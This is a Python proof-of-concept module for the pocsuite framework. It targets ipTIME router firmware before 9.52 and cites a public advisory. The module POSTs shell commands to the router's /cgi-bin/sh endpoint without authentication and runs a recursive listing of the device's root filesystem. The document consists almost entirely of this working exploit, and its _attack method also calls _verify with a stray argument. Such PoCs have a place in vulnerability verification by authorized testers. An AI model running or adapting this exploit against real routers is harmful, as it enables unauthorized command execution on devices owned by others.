#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re

class TestPOC(POCBase):
    name = "iptime listing of the root filesystem"
    vulID = ''
    author = ['sebao']
    vulType = 'Info Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-listing.of.the.root.filesystem.html'
    desc = 'listing.of.the.root.filesystem.html'


    vulDate = ''
    createDate = '2017-10-18'
    updateDate = '2017-10-18'

    appName = 'iptime'
    appVersion = '9.52'
    dork = ''
    appPowerLink = 'http://www.iptime.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url+ '/cgi-bin/sh'
        data = "X=X;echo 'Content-type: text/plain';echo;echo Listing of the root file system;echo;ls -latrR /;"
        resp = req.post(url,data=data)

        if resp.status_code == 200:
            print resp.content
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url



        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
